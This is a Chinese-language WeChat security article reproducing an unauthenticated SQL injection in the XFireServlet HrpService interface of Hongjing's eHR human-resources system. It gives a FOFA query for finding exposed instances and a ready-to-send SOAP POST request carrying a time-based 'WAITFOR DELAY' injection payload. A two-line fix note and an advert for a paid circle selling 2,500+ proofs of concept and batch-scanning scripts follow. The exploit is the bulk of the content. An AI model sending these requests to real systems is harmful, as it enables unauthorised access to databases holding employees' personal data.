---
title: 宏景人力资源管理系统 XFireServlet SQL注入漏洞
url: https://mp.weixin.qq.com/s/i-MZHG_Tr3gvI0pmseDukA
source: Doonsec's feed
date: 2026-09-11
fetch_date: 2026-09-12T06:47:12.776745
---

# 宏景人力资源管理系统 XFireServlet SQL注入漏洞

# 宏景人力资源管理系统 XFireServlet SQL注入漏洞

北雪网络安全

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

****本文章所描述的内容仅供网络安全学习使用，任何人不允许学到技术内容进行非法系统测试，作者不对任何学习文章并进行非法操作的行为负责，由本人自己承担后果，本文章仅供技术学习。****

01

更多内容

#### 网络安全学习知识库每日添加最新漏洞并提供python与 nuclei 批量探测脚本：https://pc.fenchuan8.com/#/index?forum=110296

02

搜索引擎

fofa：app="HJSOFT-HCM"

03

漏洞复现

漏洞概述：宏景人力资源管理系统（eHR）是一款由宏景软件研发的系统。宏景人力资源管理系统的 XFireServlet 接口处存在SQL注

入漏洞，未经过身份认证的远程攻击者可利用此漏洞执行任意SQL指令，从而窃取数据库敏感信息。

![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSzjibDPLRolGvJeXwHVQbhibvdv62JwBlJT0aTSGsW2Htz6ficOhKSMMoSmr5qCjn2Jw3ufbYibwxNezx6U310cFQf4ArFpjcD8XkgI/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSzjVdz9EVVsbYScR8HtjiaUI00PunAa1bS0v59uSuqtO7naQic1XK6sUWyKdakSxVV3mlgChlib7GVN0StGN22FuibfBuCDia8miaYoIU/640?wx_fmt=png&from=appmsg)

```
POST /servlet/XFireServlet/HrpService HTTP/1.1Host: {{Hostname}}Content-Type: text/xml;charset=UTF-8SOAPAction: ""User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
<soapenv:Envelopexmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"xmlns:hrp="http://www.hjsj.com/HrpService"><soapenv:Header/>   <soapenv:Body>      <hrp:getHrInfoByID>        <hrp:in0>1</hrp:in0>        <hrp:in1>1</hrp:in1>        <hrp:in2>1</hrp:in2>        <hrp:in3>1</hrp:in3>        <hrp:in4>1</hrp:in4>        <hrp:in5>1</hrp:in5>        <hrp:in6>1</hrp:in6>      </hrp:getHrInfoByID>   </soapenv:Body></soapenv:Envelope>
```

![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSzg49BbuudZeWguibcZJ5qfBtFRkUxevKibFOLPprZuo6KgNib79lj4iakCVsFZvZcfRiaM2TkBAN3iaP7T1S6ibDPYOagpwl37ooAlHLU/640?wx_fmt=png&from=appmsg)

```
POST /servlet/XFireServlet/HrpService HTTP/1.1Host: {{Hostname}}Content-Type: text/xml;charset=UTF-8SOAPAction: ""User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
<soapenv:Envelopexmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"xmlns:hrp="http://www.hjsj.com/HrpService"><soapenv:Header/>   <soapenv:Body>      <hrp:getHrInfoByID>        <hrp:in0>1</hrp:in0>        <hrp:in1>1'WAITFOR DELAY'0:0:4</hrp:in1>        <hrp:in2>1</hrp:in2>        <hrp:in3>1</hrp:in3>        <hrp:in4>1</hrp:in4>        <hrp:in5>1</hrp:in5>        <hrp:in6>1</hrp:in6>      </hrp:getHrInfoByID>   </soapenv:Body></soapenv:Envelope>
```

![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSzghjxSd9PeUKxTepPLkZ92pyZT06o2AAnN26ia60fqzWJxHrwjtWdbQOmfHL1vMl76jFjYnibMCVibW8HbksBoaicIsHKBechz39uc/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSzjgRR1cKBAvUVUFjiazUOJbdnMPZG2MnOU4fibrnNc5A7SQU7k5PiadCXwexw4M6HGhicfnicbluz4KaLCFiaDXKYic8ggLOFxFHgzUCM/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSzguYmZ1ycS7Osw6dMBTcUtcrweXsqoKfOagEgJt18EVibh6XDibjaEbeq3ARN4icszqbGrBFaZ6VBrMTSI7XJtyK6vTEnJZ9C9ezg/640?wx_fmt=png&from=appmsg)

04

修复建议

1、关闭互联网暴露面或接口设置访问权限

2、升级至安全版本

05

内部圈子

🛠️ 【知名漏洞实战圈，纯干货】🛠️

还在找公开漏洞POC而烦恼？还在为漏洞不会验证而发愁？还在为发现不了漏洞而自卑？这里漏洞圈子解决你的困惑！
目前已更新poc数量2500+

![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSzhAXToXXZfMgZFhDABJk6JKcy9mzftQz4mIXbXcoOdb1HUBgfgqdswF7aolB4Cj66TtTWKLoBHlyIt5IU3hFnbHnKIQ4HyM6Vw/640?wx_fmt=png&from=appmsg)

🎯 适用场景

**▫️渗透测试**▫️企业漏洞自查****▫️****攻防演练****▫️****安全服务****▫️****合规运营****

****![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSzhmOZcjPDMpyAodIoYp8odAiafHI26J4icy2d0v0asvoeK3ZAf3q3W7t3EKbMoaJJrG8AMbYFPQ3bJMyzGc5jFm6wj4M82SABFkc/640?wx_fmt=png&from=appmsg)****

**▫️微信扫一扫进入付费圈子查看更多漏洞内容。**

****▫️**全民掌握网安技能，共守智能时代晴空。**

预览时标签不可点

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSzjnJSMCbXtribgZvAJkvYkoOvpBvPF0qhoF9YzA6fEqEfv9BgW7zHvsKKlzrgAFaGiaMSJk9eObsFyRqjoKl6QuVVC65jmCxZnSQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过